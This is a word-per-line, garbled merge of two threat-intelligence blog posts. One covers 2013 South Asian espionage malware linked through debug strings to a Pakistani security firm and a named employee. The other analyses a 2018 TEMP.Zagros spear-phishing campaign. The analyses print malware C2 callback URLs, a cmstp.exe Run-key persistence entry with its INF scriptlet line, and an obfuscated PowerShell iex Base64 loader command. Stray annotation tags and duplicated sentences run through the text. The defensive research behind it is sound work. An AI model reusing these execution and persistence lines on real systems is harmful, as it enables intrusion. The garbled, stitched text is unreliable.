regional
and
middle
powers
within
South
Asia
are
seeking
to
leverage
global
cyber
espionage
in
an
effort
to
achieve
parity
with
nation
states
who
have
far-reaching
diplomatic
power
,
modernized
militaries
and
influential
economies
.

Ultimately
,
these
emergent
economies
are
likely
seeking
to
hasten
their
path
to
success
in
fulfilling
national
objectives
via
the
'
short-cut
'
that
cyber
espionage
offers
.

Individual
countries
within
the
Indo-Pak
subcontinent
are
increasingly
involved
in
cyber
attacks
and
targeted
espionage
campaigns
.

South
Asia
is
no
stranger
to
deeply
rooted
conventional
conflict
which
is
most
often
a
strong
harbinger
of
cyber
conflict
.

On
March
17th
,
2013
,
the
Norwegian-based
,
global
telecommunications
provider
Telenor
reported
a
network
breach
from
an
unknown
sophisticated
threat
actor
that
targeted
Telenor
executives
using
custom
malware
implants
.

The
attackers
were
responsible
for
pilfering
email
archives
and
documents
from
Telenor
executives
,
compromising
their
intellectual
property
and
business
operations
.

Nearly
two
months
later
,
the
Norwegian
antivirus
and
security
firm
Norman
issued
an
investigative
analysis
report
titled
Operation
Hangover
:
Unveiling
an
Indian
Cyberattack
Infrastructure
that
detailed
cyber
espionage
activities
associated
with
the
Telenor
compromise
.

They
noted
similar
targeting
campaigns
that
were
observed
exploiting
numerous
industries
and
organizations
within
Norway
,
Pakistan
,
US
,
Iran
,
China
,
Taiwan
,
Thailand
,
Jordan
,
Indonesia
,
UK
,
Germany
,
Austria
,
Poland
,
and
Romania
.

Norman
speculated
that
a
group
associated
with
an
identified
private
Indian
information
security
company
likely
carried
out
the
espionage
campaigns
.

Norman's
43
page
assessment
concluded
that
a
sophisticated
Indian
exploitation
team
was
indeed
responsible
for
the
network
breach
and
Telenor
compromise
.

The
TCIRT
believes
that
a
possible
theory
that
supports
an
Indian
attack
scenario
is
that
the
Telenor
subsidiary
,
Telenor
Pakistan
,
is
a
strategic
communications
infrastructure
provider
.

Telenor
Pakistan
provides
voice
,
data
content
and
mobile
communications
to
more
than
3,500
cities
and
towns
within
Pakistan
.

Persistent
remote
Indian
access
to
a
strategic
communications
service
provider
,
such
as
Telenor
Pakistan
,
would
certainly
yield
unparalleled
signals
intelligence
collection
capability
.

The
information
obtained
would
be
of
strategic
value
to
Indian
intelligence
services
.

New
Findings
:

In
light
of
the
recent
revelation
of
Indian
involvement
in
the
targeting
of
Telenor
,
it
is
critical
for
us
to
consider
the
borderless
nature
of
cyber
espionage
and
to
understand
how
regional
cyber
conflicts
can
spill
across
geographies
and
affect
critical
commercial
business
operations
.

As
part
of
an
ongoing
TCIRT
focused
research
and
analysis
,
we
have
found
custom
malware
being
used
operationally
'
in
the
wild
'
that
may
be
targeting

Indian
military
and
government
related
entities
,
as
well
as
other
unidentified
South
Asian
targets
.

This
activity
is
possibly
linked
to
an
identified
Pakistani
information
security
company
.

The
Malware
:

In
late
May
2013
,
TCIRT
identified
a
malicious
file
hosted
at
[http://]
199.91.173  B_ip.distribute
[.]43/new_salary/salary_revision.scr
(
Kansas
City
,
Missouri
)
.
This
file
was
a
self-extracting
(
SFX B_malware.drop
)
archive
that
,
when
executed
,
presents
the
target
victim
with
a
12
page
decoy
PDF
document
.

The
document
was
an
official
Government
of
India
(
GoI
)
,
Ministry
of
Defense
(
MoD
)
pension
memorandum
of
record
.

It
is
highly
likely
that
the
malware
and
decoy
document
would
be
tailored
for
and
delivered
to
specific
recipients
associated
with
the
GoI
or
MoD
.

The
SFX B_malware.drop
dropper I
contained
multiple
custom
executable
files
,
as
well
as
legitimate
Microsoft
Visual
C++
Runtime
Library
files
,
which
are
part
of
the
codebase
used
to
develop
and
required
to
execute
the
backdoor
code
.

The
malware
also
uses
the
legitimate
cURL
library
in
the
form
of
libcurld.dll
.

The
open-source
cURL
library
is
a
multiprotocol
transfer
library
used
primarily
for
FTP
and
HTTP
transactions
.

The
main
backdoor
component
is
found
in
winsocks.exe  B_malware.backdoor
.

The
files
ExtractPDF.exe  B_malware.backdoor
and
Start.exe B_malware.backdoor
simply
serve
as
utilities
to
open
the
PDF
file
and
execute
the
winsocks.exe  B_malware.backdoor
backdoor
component
.

When
executed
,
the
winsocks.exe  B_malware.backdoor
backdoor
requests
a
PHP
update
callback
at
[http://]
199.91.173  B_ip.distribute
[.]43/fetch_updates_8765.php?compname=<COMPUTERNAME>
.

A
version.txt
file
is
also
requested
by
the
malware
.

This
file
contained
a
version
number
1.0
,
likely
denoting
the
version
of
the
backdoor
and
/
or
the
command
and
control
(
C2
)
backend
.

The
winsocks.exe  B_malware.backdoor
backdoor
also
contains
hardcoded
strings
of
Office
file
extensions
,
telegraphing
the
likely
intention
of
the
attackers
in
collecting
and
exfiltrating
office
automated
documents
from
victim
networks
.

Another
variant
of
this
backdoor
uses
the
same
winsocks.exe  B_malware.backdoor
with
a
different
dropping
mechanism
and
was
found
at
[http://]
199.91.173  B_ip.distribute
[.]43/Classified_Video.flv.scr
and
[http://]
199.91.173  B_ip.distribute
[.]43/sarbajit_leaked_video.wmv.scr
.

Both
of
these
.scr
files
have
the
same
MD5
.

In
this
SFX
,
Windows
batch
files
had
replaced
the
ExtractPDF.exe  B_malware.backdoor
and
Start.exe B_malware.backdoor
with
a
decoy
Flash
video
(
FLV
)
file
was
used
in
place
of
the
decoy
PDF
.

An
FLV
file
is
an
interesting
choice
of
decoy
document
since
it
is
not
a
standard
video
format
for
media
players
.

The
dynamic
DNS
domains
windowsupdate.noip[.]biz
and
masalavideos.no-ip[.]biz
were
also
being
mapped
to
IP
Address
199.91.173.43 B_ip.distribute
as
of
late
May
2013
,
when
the
video
themed
malicious
attachments
were
being
operationalized
.

When
opened
the
flash
video
simply
displays
a
couple
kissing
passionately
.

Implementing
the
use
of
free
dynamic
DNS
services
,
such
as
those
of
NO-IP
within
targeting
and
exploitation
phases
of
attack
,
are
very
common
techniques
used
by
a
variety
sophisticated
threat
groups
.

The
file
sarbajit_leaked_video.wmv.scr
contains
a
compile
time
of
May
28
,
2013
19:53:26
UTC
.

The
filename
is
possibly
a
misspelled
reference
to
Sarabjit
Singh
,
an
Indian
national
who
was
arrested
and
convicted
of
terrorism
and
espionage
charges
in
1991
by
Pakistani
authorities
.

After
a
protracted
22
year
legal
battle
,
Sarabjit
Singh
would
become
the
victim
of
a
severe
beating
by
Pakistani
prisoners
and
would
later
die
of
his
injuries
in
a
Lahore
hospital
on
May
2
,
2013
.

News
of
the
attack
and
subsequent
death
of
Sarabjit
Singh
incited
protests
in
India
that
increased
regional
Indo-Pakistani
tensions
and
served
as
a
catalyst
for
bilateral
governmental
negotiations
between
Delhi
and
Islamabad
.

This
file
was
created
26
days
after
the
death
of
Sarabjit
Singh
,
and
would
be
of
relevance
to
targeted
Indian
entities
,
much
like
the
official
Government
of
India
(
GoI
)
,
Ministry
of
Defense
(
MoD
)
pension
memorandum
.

Significant
Malware
Artifacts
:

Operational
Caveat
:
It
is
important
to
note
that
there
are
information
gaps
which
diminish
our
ability
to
establish
a
definitive
explanation
for
the
malicious
activity
and
identify
the
responsible
entities
behind
the
authorship
and
use
of
the
identified
malware
.

Below
the
TCIRT
simply
highlights
the
facts
associated
with
specific
artifacts
identified
within
the
malware
.

Most
of
the
dropped
malware
binaries
contained
a
debug
string
that
sheds
light
on
the
possible
developers
and
operators
of
the
malware
.

The
significance
of
the
username
Tranchulas
within
the
debug
path
of
the
winsocks.exe  B_malware.backdoor
binary
is
that
Tranchulas
is
a
Pakistani
information
security
consulting
company
with
offices
in
the
United
Kingdom
,
United
States
,
and
Pakistan
.

The
CEO
of
Tranchulas
is
Zubair
Khan
,
a
Pakistani
national
and
information
security
executive
who
has
'
been
researching
mainly
on
[sic]
cyber
warfare
'
.

Khan
also
likely
maintains
a
close
relationship
to
the
Pakistani
government
.

According
to
this
online
biography
,
he
is
responsible
for
the
penetration
testing
of
Pakistani
homeland
security
solutions
and
has
consulted
for
the
Pakistani
National
Database
and
Registration
Authority
(
NADRA
)
.

Proximity
to
such
sensitive
security
programs
suggest
a
certain
level
of
trust
on
behalf
of
the
Pakistani
government
,
and
may
indicate
that
official
Pakistani
entities
could
have
access
to
Tranchulas
technical
support
for
various
security
projects
or
programs
.

An
ironic
,
yet
noteworthy
observation
is
that
the
Tranchulas
website
boasts
Telenor
as
a
client
.

Tranchulas
also
serves
as
an
official
sponsor
for
the
Pakistan
CERT
in
addition
to
maintaining
the
official
Pakistan
CERT
website
(
cert.org.pk
)
.

On
July
2
,
2013
a
similar
file
windefender.exe B_malware.backdoor
(
MD5
:
a21f2cb65a3467925c1615794cce7581  B_hash
)
was
identified
containing
a
strong
association
to
Tranchulas
.

This
particular
binary
contained
the
following
debug
string
:

C:\Users\umairaziz27\Documents\Visual
Studio
2008\Projects\usb\Release\usb.pdb

The
username
'
UmairAziz27
'
reveals
a
Twitter
account
@umairaziz27
for
an
'
Optimistic
Patriot
by
choice
'
who
is
'
Working
as
InfoSec
Analyst
at
@Tranchulas
.
'

Umair
Aziz
(
umairaziz27
)
maintains
a
LinkedIn
professional
profile
that
highlights
his
employment
at
Tranchulas
and
reveals
that
he
was
educated
at
the
National
University
of
Sciences
and
Technology
School
of
Electrical
Engineering
and
Computer
Science
(
NUST-SEECS
)
in
Pakistan
.

A
second
host
within
the
same
199.91.173  B_ip.distribute
[.]40/29
subnet
was
also
identified
hosting
similar
zipped
malware
at
[http://]
199.91.173  B_ip.distribute
[.]45/OBL_Leaked_Report.zip
and
[http://]
199.91.173  B_ip.distribute
[.]45/Naxalites_Funded_By_Pakistan.zip
.

The
OBL_Leaked_Report.zip
contained
a
.scr
file
that
drops
a
decoy
document
pertaining
to
the
alleged
incompetence
of
Pakistani
authorities
in
locating
Osama
Bin
Laden
(
OBL
)
.

This
OBL
malware
drops
a
windefender.exe B_malware.backdoor
backdoor
component
(
MD5
:
35663e66d02e889d35aa5608c61795eb  B_hash
)
In
this
case
,
the
debug
string
is
:

C:\Users\Cert-India\Documents\Visual
Studio
2008\Projects\ufile\Release\ufile.pdb
.

The
binaries
that
contain
the
'
umairaziz27ʺ′′
and
'
Cert-India
'
debug
strings
are
designed
to
call
back
to
[http://]
199.91.173  B_ip.distribute
[.]45/fetch_updates_8765_tb.php
?
compname=<COMPUTERNAME>
and
[http://]
199.91.173  B_ip.distribute
[.]45/is_array.php?compname=<COMPUTERNAME>
.
Meanwhile
,
the

Naxalites_Funded_By_Pakistan.scr
file
drops
a
slightly
different
malware
component
and
an
alternate
decoy
document
.

The
dropped
implant
,
showppt.scr
(
MD5
:
165ac370b54e664812e4c15b2396ccd6  B_hash
)
,
is
a
downloader
that
connects
to
[http://]
199.91.173  B_ip.distribute
[.]45/
and
downloads
both
legitimate
library
files
and
malicious
second
stage
binaries
.

Working
Hypotheses
:

The
use
of
Tranchulas
and
UmairAziz27
in
the
malware
debugging
paths
,
in
addition
to
the
multiple
targeting
campaigns
that
maintain
themes
likely
aimed
at
Indian
entities
or
involving
Pakistan
related
issues
,
leads
us
to
assess
the
following
competing
hypotheses
which
may
be
considered
as
plausible
explanations
for
the
identified
activity
:

Hypothesis
1
:
Tranchulas
developed
the
malicious
binaries
,
and
staged
them
for
offensive
exploitation
operations
on
behalf
of
an
unidentified
customer
.

Hypothesis
2
:
Tranchulas
developed
and
sold
the
malicious
binaries
to
an
unidentified
customer
,
where
they
were
later
operationalized
by
an
unidentified
entity
.

Hypothesis
3
:
An
unidentified
third
party
unaffiliated
with
Tranchulas
developed
the
malware
,
deliberately
including
misleading
software
artifacts
as
a
direct
effort
to
create
speculation
and
shift
blame
toward
Tranchulas
.

Hypothesis
4
:
A
rogue
Tranchulas
employee
used
company
resources
without
company
knowledge
to
develop
the
malware
,
where
an
unknown
operator
later
used
it
offensively
.

Hypothesis
5
:
Indian
entities
actively
sought
and
utilized
the
services
of
Pakistan
based
information
security
company
,
Tranchulas
,
for
an
officially
sanctioned
and
authorized
penetration
test
.

The
malicious
implants
were
subsequently
developed
and
used
as
part
of
official
Tranchulas
service
offerings
,
while
the
files
and
infrastructure
used
for
the
audit
were
submitted
to
publicly
available
malware
analysis
services
.

Hypothesis
6
:
An
unidentified
Indian
entity
developed
and
used
this
malware
as
a
realistic
simulated
exercise
to
perform
penetration
testing
and
evaluate
their
readiness
in
the
event
of
actual
Pakistani
affiliated
offensive
network
operations
.

The
files
and
infrastructure
used
for
the
simulation
were
submitted
to
publicly
available
malware
analysis
services
.

Conclusion
:

Considering
the
long-standing
regional
tensions
between
India
and
Pakistan
,
South
Asia
serves
as
a
likely
flashpoint
for
conventional
conflict
to
carry
over
and
play
out
within
cyberspace
.

Public
and
private
sectors
alike
should
begin
to
increase
their
awareness
of
emerging
cyber
threats
from
the
lesser-known
middle
powers
.

Regardless
of
sophistication
,
these
threats
may
support
future
belligerents
who
have
or
will
eventually
possess
the
capability
and
intent
to
disrupt
critical
business
operations
.

Details
associated
with
this
threat
have
been
shared
with
the
ThreatConnect
Community
within
Incident
'
20130731A
:
South
Asia
Cyber
Espionage
Heats
Up
'
.

If
you
or
your
organization
is
interested
in
obtaining
crowd-sourced
threat
intelligence
that
increases
your
awareness
of
emerging
cyber
threats
,
please
register
at
ThreatConnect.com  B_url.normal
and
join
our
community
.

Tags
:
Cyber
Espionage
,
India
,
Pakistan
,
South
Asia
,
Telenor

Next
article

SUBSCRIBE
TO
OUR
BLOG
VIA

OR
EMAIL

Previous
article

No
Comments

Search
the
Site
...

RSS
feed

Email
Address

Recent
Posts

Cyber
Squared
Launches
ThreatConnectTM
API

ThreatConnect
Gets
to
the
Root
of
Targeted
Exploitation
Campaigns

ThreatConnect
Takes
Signature
Management
to
the
Next
Level

The
Dollars
and
'
Sense
'
Behind
Threat
Intelligence
Sharing

Divide
and
Conquer
:
Unmasking
China's
'
Quarian
'
Campaigns
Through
Community

Categories

In
The
News

Press
Releases

Research

Archives

January
2014

December
2013

November
2013

October
2013

September
2013

August
2013

Threat
Connect
.
Identify
the
Threat
Sign
up
for
Free

Follow
Us

Facebook

Twitter

Contact
Us
•
Privacy
Policy
•
Terms
of
Service
©
2014
CyberSquared
Inc
.
All
Rights
Reserved

Threat
Intelligence

Why
Threat
Intelligence
is
Important

How
to
Develop
Threat
Intelligence

Community
Collaboration
Case
Study

Platform

Capabilities

Integrations

ThreatConnectTM
API

ThreatConnectTM
Cloud

Cloud
Security

Upgrade

Communities

Private
Communities

Moderated
Common
Community

Moderated
Subscriber
Communities

Intelligence
Research
Team

Data
Privacy

Methodology

Diamond
Model
of
Intrusion
Analysis

Threat
Inference
Engine

Collaborative
Intelligence

News
&
Events

In
The
News

Press
Releases

Blog

About

Leadership

Careers

Contact
Us
Solutions

Services

Partners

Support

Resources

Company

Home

FireEye
Blogs

Threat
Research

Iranian
Threat
Group
Updates
Tactics
,
Techniques
a
...

Iranian
Threat
Group
Updates
Tactics
,
Techniques
a
...

Iranian
Threat
Group

Updates
Tactics
,
Techniques
and
Procedures
in
Spear B_malware.drop
Phishing  I
Campaign

March
13
,
2018
|
by
Sudeep
Singh
,
Dileep
Kumar
Jallepalli
,
Yogesh
Londhe
,
Ben
Read

Introduction

From
January
2018
to
March
2018
,
through
FireEye's
Dynamic
Threat
Intelligence
,
we
observed
attackers
leveraging
the
latest
code
execution
and
persistence
techniques
to
distribute
malicious
macro-based
documents
to
individuals
in
Asia
and
the
Middle
East
.

We
attribute
this
activity
to
TEMP.Zagros
(
reported
by
Palo
Alto
Networks
and
Trend
Micro
as
MuddyWater
)
,
an
Iran-nexus
actor
that
has
been
active
since
at
least
May
2017
.

This
actor
has
engaged
in
prolific
Spear B_malware.drop
phishing  I
of
government
and
defense
entities
in
Central
and
Southwest
Asia
.

The
Spear B_malware.drop
phishing  I
emails
and
attached
malicious
macro
documents
typically
have
geopolitical
themes
.

When
successfully
executed
,
the
malicious
documents
install
a
backdoor
we
track
as
POWERSTATS
.

One
of
the
more
interesting
observations
during
the
analysis
of
these
files
was
the
re-use
of
the
latest
AppLocker
bypass
,
and
lateral
movement
techniques
for
the
purpose
of
indirect
code
execution
.

The
IP
address
in
the
lateral
movement
techniques
was
substituted
with
the
local
machine
IP
address
to
achieve
code
execution
on
the
system
.

substituted
with
the
local
machine
IP
address
to
achieve
code
execution
on
the
system
.

Campaign
Timeline

In
this
campaign
,
the
threat
actor's
tactics
,
techniques
and
procedures
(
TTPs
)
shifted
after
about
a
month
,
as
did
their
targets
.

A
brief
timeline
of
this
activity
is
shown
in
Figure
1
.

Figure
1
:
Timeline
of
this
recently
observed
Spear B_malware.drop
phishing  I
campaign
.

The
first
part
of
the
campaign
(
From
Jan
.
23
,
2018
,
to
Feb
.
26
,
2018
)
used
a
macro-based
document
that
dropped
a
VBS
file
and
an
INI
file
.

The
INI
file
contains
the
Base64
encoded
PowerShell
command
,
which
will
be
decoded
and
executed
by
PowerShell
using
the
command
line
generated
by
the
VBS
file
on
execution
using
WScript.exe
.

The
process
chain
is
shown
in
Figure
2
.

Figure
2
:
Process
chain
for
the
first
part
of
the
campaign
.

Although
the
actual
VBS
script
changed
from
sample
to
sample
,
with
different
levels
of
obfuscation
and
different
ways
of
invoking
the
next
stage
of
process
tree
,
its
final
purpose
remained
same
:
invoking
PowerShell
to
decode
the
Base64
encoded
PowerShell
command
in
the
INI
file
that
was
dropped
earlier
by
the
macro
,
and
executing
it
.

One
such
example
of
the
VBS
invoking
PowerShell
via
MSHTA
is
shown
in
Figure
3
.

Figure
3
:
VBS
invoking
PowerShell
via
MSHTA
.

The
second
part
of
the
campaign
(
from
Feb
.
27
,
2018
,
to
March
5
,
2018
)
used
a
new
variant
of
the
macro
that
does
not
use
VBS
for
PowerShell
code
execution
.

Instead
,
it
uses
one
of
the
recently
disclosed
code
execution
techniques
leveraging
INF
and
SCT
files
,
which
we
will
go
on
to
explain
later
in
the
blog
.

Infection
Vector

We
believe
the
infection
vector
for
all
of
the
attacks
involved
in
this
campaign
are
macro-based
documents
sent
as
an
email
attachment
.

One
such
email
that
we
were
able
to
obtain
was
targeting
users
in
Turkey
,
as
shown
in
Figure
4
:

Figure
4
:
Sample
Spear B_malware.drop
phishing  I
email
containing
macro-based
document
attachment
.

The
malicious
Microsoft
Office
attachments
that
we
observed
appear
to
have
been
specially
crafted
for
individuals
in
four
countries
:
Turkey
,
Pakistan
,
Tajikistan
and
India
.

What
follows
is
four
examples
,
and
a
complete
list
is
available
in
the
Indicators
of
Compromise
section
at
the
end
of
the
blog
.

Figure
5
shows
a
document
purporting
to
be
from
the
National
Assembly
of
Pakistan
.

Figure
5
:
Document
purporting
to
be
from
the
National
Assembly
of
Pakistan
.

A
document
purporting
to
be
from
the
Turkish
Armed
Forces
,
with
content
written
in
the
Turkish
language
,
is
shown
in
Figure
6
.

Figure
6
:
Document
purporting
to
be
from
the
Turkish
Armed
Forces
.

A
document
purporting
to
be
from
the
Institute
for
Development
and
Research
in
Banking
Technology
(
established
by
the
Reserve
Bank
of
India
)
is
shown
in
Figure
7
.

Figure
7
:
Document
purporting
to
be
from
the
Institute
for
Development
and
Research
in
Banking
Technology
.

Figure
8
shows
a
document
written
in
Tajik
that
purports
to
be
from
the
Ministry
of
Internal
Affairs
of
the
Republic
of
Tajikistan
.

Figure
8
:
Document
written
in
Tajik
that
purports
to
be
from
the
Ministry
of
Internal
Affairs
of
the
Republic
of
Tajikistan
.

Each
of
these
macro-based
documents
used
similar
techniques
for
code
execution
,
persistence
and
communication
with
the
command
and
control
(
C2
)
server
.

Indirect
Code
Execution
Through
INF
and
SCT

This
scriptlet
code
execution
technique
leveraging
INF
and
SCT
files
was
recently
discovered
and
documented
in
February
2018
.

The
threat
group
in
this
recently
observed
campaign
–
TEMP.Zagros
–
weaponized
their
malware
using
the
following
techniques
.

The
macro
in
the
Word
document
drops
three
files
in
a
hard
coded
path
:
C:\programdata
.

Since
the
path
is
hard
coded
,
the
execution
will
only
be
observed
in
operating
systems
,
Windows
7
and
above
.

The
following
are
the
three
files
:
Defender.sct
–
The
malicious
JavaScript
based
scriptlet
file
.

Defender.sct
–
The
malicious
JavaScript
based
scriptlet
file
.

DefenderService.inf
–
The
INF
file
that
is
used
to
invoke
the
above
scriptlet
file
.

WindowsDefender.ini
–
The
Base64
encoded
and
obfuscated
PowerShell
script
.

After
dropping
the
three
files
,
the
macro
will
set
the
following
registry
key
to
achieve
persistence
:
\REGISTRY\USER\SID\Software\Microsoft\Windows\CurrentVersio
n\Run\'WindowsDefenderUpdater
'
=
cmstp.exe
/s
c:\programdata\DefenderService.inf

Upon
system
restart
,
cmstp.exe
will
be
used
to
execute
the
SCT
file
indirectly
through
the
INF
file
.

This
is
possible
because
inside
the
INF
file
we
have
the
following
section
:
[UnRegisterOCXSection]
%11%\scrobj.dll,NI,c:/programdata/Defender.sct

That
section
gets
indirectly
invoked
through
the
DefaultInstall_SingleUser
section
of
INF
,
as
shown
in
Figure
9
.

Figure
9
:
Indirectly
invoking
SCT
through
the
DefaultInstall_SingleUser
section
of
INF
.

This
method
of
code
execution
is
performed
in
an
attempt
to
evade
security
products
.

FireEye
MVX
and
HX
Endpoint
Security
technology
successfully
detect
this
code
execution
technique
.

SCT
File
Analysis

SCT
File
Analysis

The
code
of
the
Defender.sct
file
is
an
obfuscated
JavaScript
.

The
main
function
performed
by
the
SCT
file
is
to
Base64
decode
the
contents
of
WindowsDefender.ini
file
and
execute
the
decoded
PowerShell
Script
using
the
following
command
line
:
powershell.exe
-exec
Bypass
-c
iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((getcontent
C:\\ProgramData\\WindowsDefender.ini
)

The
rest
of
the
malicious
activities
are
performed
by
the
PowerShell
Script
.

PowerShell
File
Analysis

The
PowerShell
script
employs
several
layers
of
obfuscation
to
hide
its
actual
functionality
.

In
addition
to
obfuscation
techniques
,
it
also
has
the
ability
to
detect
security
tools
on
the
analysis
machine
,
and
can
also
shut
down
the
system
if
it
detects
the
presence
of
such
tools
.

Some
of
the
key
obfuscation
techniques
used
are
:

Character
Replacement
:
Several
instances
of
character
replacement
and
string
reversing
techniques
(
Figure
10
)
make
analysis
difficult
.

Figure
10
:
Character
replacement
and
string
reversing
techniques
.

PowerShell
Environment
Variables
:
Nowadays
,
malware
authors
commonly
mask
critical
strings
such
as
'
IEX
'
using
environment
variables
.

Some
of
the
instances
used
in
this
script
are
:
$eNv:puBLic[13]+$ENv:pUBLIc[5]+'x
'
(
$ENV:cOMsPEC[4,26,25]-jOin
'
'
)

XOR
encoding
:
The
biggest
section
of
the
PowerShell
script
is
XOR
encoded
using
a
single
byte
key
,
as
shown
in
Figure
11
.

Figure
11
:
PowerShell
script
is
XOR
encoded
using
a
single
byte
key
.

After
deobfuscating
the
contents
of
the
PowerShell
Script
,
we
can
divide
it
into
three
sections
.

Section
1

The
first
section
of
the
PowerShell
script
is
responsible
for
setting
different
key
variables
that
are
used
by
the
remaining
sections
of
the
PowerShell
script
,
especially
the
following
variables
:

TEMpPAtH
=
'
C:\ProgramData\
'
(
the
path
used
for
storing
the
temp
files
)

Get_vAlIdIP
=
https://api.ipify.org/
(
used
to
get
the
public
IP
address
of
the
machine
)

FIlENAmePATHP
=
WindowsDefender.ini
(
file
used
to
store
Powershell
code
)

PRIVAtE
=
Private
Key
exponents

PUbLIc
=
Public
Key
exponents

Hklm
=
'
HKLM:\Software\
'

Hkcu
=
'
HKCU:\Software\
'

ValuE
=
'
kaspersky
'

SYSID

DrAGon_MidDLe
=
[array
of
proxy
URLs]

Among
those
variables
,
there
is
one
variable
of
particular
interest
,
DrAGon_MidDLe
,
which
stores
the
list
of
proxy
URLs
(
detailed
at
the
end
of
the
blog
in
the
Network
Indicators
portion
of
the
Indicators
of
Compromise
section
)
that
will
be
used
to
interact
with
the
C2
server
,
as
shown
in
Figure
12
.

Figure
12
:
DrAGon_MidDLe
stores
the
list
of
proxy
URLs
used
to
interact
with
C2
server
.

Section
2

The
second
section
of
the
PowerShell
script
has
the
ability
to
perform
encryption
and
decryption
of
messages
that
are
exchanged
between
the
system
and
the
C2
server
.

The
algorithm
used
for
encryption
and
decryption
is
RSA
,
which
leverages
the
public
and
private
key
exponents
included
in
Section
1
of
the
PowerShell
script
.

Section
3

The
third
section
of
the
PowerShell
script
is
the
biggest
section
and
has
a
wide
variety
of
functionalities
.

During
analysis
,
we
observed
a
code
section
where
a
message
written
in
Chinese
and
hard
coded
in
the
script
will
be
printed
in
the
case
of
an
error
while
connecting
to
the
C2
server
:

The
English
translation
for
this
message
is
:
'
Cannot
connect
to
website
,
please
wait
for
dragon
'
.

Other
functionalities
provided
by
this
section
of
the
PowerShell
Script
are
as
follows
:

Retrieves
the
following
data
from
the
system
by
leveraging
Windows
Management
Instrumentation
(
WMI
)
queries
and
environment
variables
:

IP
Address
from
Network
Adapter
Configuration

OS
Name

OS
Architecture

Computer
Name

Computer
Domain
Name

Username

All
of
this
data
is
concatenated
and
formatted
as
shown
in
Figure
13
:

Figure
13
:
Concatenated
and
formatted
data
retrieved
by
PowerShell
script
.

Register
the
victim's
machine
to
the
C2
server
by
sending
the
REGISTER
command
to
the
server
.

In
response
,
if
the
status
is
OK
,
then
a
TOKEN
is
received
from
the
C2
server
that
is
used
to
synchronize
the
activities
between
the
victim's
machine
and
the
C2
server
.

While
sending
to
the
C2
server
,
the
data
is
formatted
as
follows
:
@{SYSINFO
=
$get.ToString();
ACTION
=
'
REGISTER';}

Ability
to
take
screenshots
.

Checks
for
the
presence
of
security
tools
(
detailed
in
the
Appendix
)
and
if
any
of
these
security
tools
are
discovered
,
then
the
system
will
be
shut
down
,
as
shown
in

Figure
14
.

Figure
14
:
System
shut
down
upon
discovery
of
security
tools
.

Ability
to
receive
PowerShell
script
from
the
C2
server
and
execute
on
the
machine
.

Several
techniques
are
employed
for
executing
the
PowerShell
code
:

If
command
starts
with
'
excel
'
,
then
it
leverages
DDEInitiate
Method
of
Excel.Appilcation
to
execute
the
code
:

If
the
command
starts
with
'
outlook
'
,
then
it
leverages
Outlook.Application
and
MSHTA
to
execute
the
code
:

If
the
command
starts
with
'
risk
'
,
then
execution
is
performed
through
DCOM
object
:

File
upload
functionality
.

Ability
to
disable
Microsoft
Office
Protected
View
(
as
shown
in
Figure
15
)
by
setting
the
following
keys
in
the
Windows
Registry
:

DisableAttachmentsInPV

DisableInternetFilesInPV

DisableUnsafeLocationsInPV

Figure
15
:
Disabling
Microsoft
Office
Protected
View
.

Ability
to
remotely
reboot
or
shut
down
or
clean
the
system
based
on
the
command
received
from
the
C2
server
,
as
shown
in
Figure
16
.

Figure
16
:
Reboot
,
shut
down
and
clean
commands
.

Ability
to
sleep
for
a
given
number
of
seconds
.

The
following
table
summarizes
the
main
C2
commands
supported
by
this
PowerShell
Script
.

C2
Command

Purpose
reboot
shutdown
clean
screenshot
upload
excel
outlook
risk

Reboot
the
system
using
shutdown
command

Shut
down
the
system
using
shutdown
command

Wipe
the
Drives
,
C:\
,
D:\
,
E:\
,
F:\

Take
a
screenshot
of
the
System

Encrypt
and
upload
the
information
from
the
system

Leverage
Excel.Application
COM
object
for
code
execution

Leverage
Outlook.Application
COM
object
for
code
execution

Leverage
DCOM
object
for
code
execution

Conclusion

This
activity
shows
us
that
TEMP.Zagros
stays
up-to-date
with
the
latest
code
execution
and
persistence
mechanism
techniques
,
and
that
they
can
quickly
leverage
these
techniques
to
update
their
malware
.

By
combining
multiple
layers
of
obfuscation
,
they
deter
the
process
of
reverse
engineering
and
also
attempt
to
evade
security
products
.

Users
can
protect
themselves
from
such
attacks
by
disabling
Office
macros
in
their
settings
and
also
by
being
more
vigilant
when
enabling
macros
(
especially
when
prompted
)
in
documents
,
even
if
such
documents
are
from
seemingly
trusted
sources
.

Indicators
of
Compromise

Macro
based
Documents
and
Hashes

SHA256
Hash
eff78c23790ee834f773569b52cddb01dc3c4dd9660f5a476af044ef6fe73894  B_hash

Filename
na.doc

Targeted

Region

Pakistan
76e9988dad0278998861717c774227bf94112db548946ef617bfaa262cb5e338  B_hash

Invest
in
Turkey.doc

Turkey
6edc067fc2301d7a972a654b3a07398d9c8cbe7bb38d1165b80ba4a13805e5ac  B_hash
güvenlik
yönergesi
.
.doc

Turkey
009cc0f34f60467552ef79c3892c501043c972be55fe936efb30584975d45ec0  B_hash
18479a93fc2d5acd7d71d596f27a5834b2b236b44219bb08f6ca06cf760b74f6  B_hash

idrbt.doc

India

Türkiye
Cumhuriyeti
Kimlik

Kartı.doc

Turkey

Turkish
Armed
Forces.doc
3da24cd3af9a383b731ce178b03c68a813ab30f4c7c8dfbc823a32816b9406fb  B_hash
9038ba1b7991ff38b802f28c0e006d12d466a8e374d2f2a83a039aabcbe76f5c  B_hash

Turkish
Armed
Forces.doc
na.gov.pk.doc

Turkey

Pakistan
3b1d8dcbc8072b1ec10f5300c3ea9bb20db71bd8fa443d97332790b74584a115  B_hash
MVD-FORM-1800.doc

Tajikistan
cee801b7a901eb69cd166325ed3770daffcd9edd8113a961a94c8b9ddf318c88  B_hash

KEGM-CyberAttack.doc

Turkey
1ee9649a2f9b2c8e0df318519e2f8b4641fd790a118445d7a0c0b3c02b1ba942  B_hash

IL-1801.doc
aa60c1fae6a0ef3b9863f710e46f0a7407cf0feffa240b9a4661a4e8884ac627  B_hash
kiyiemniyeti.doc

Turkey

Turkey
93745a6605a77f149471b41bd9027390c91373558f62058a7333eb72a26faf84  B_hash

TCELL-S1-M.doc

Tajikistan
c87799cce6d65158da97aa31a5160a0a6b6dd5a89dea312604cc66ed5e976cc9  B_hash
egm-1.doc

Turkey
2cea0b740f338c513a6390e7951ff3371f44c7c928abf14675b49358a03a5d13  B_hash

Connectel
.pk.doc

Pakistan
18cf5795c2208d330bd297c18445a9e25238dd7f28a1a6ef55e2a9239f5748cd  B_hash
gÃŸvenlik_yÃœnergesi_.doc
Turkey
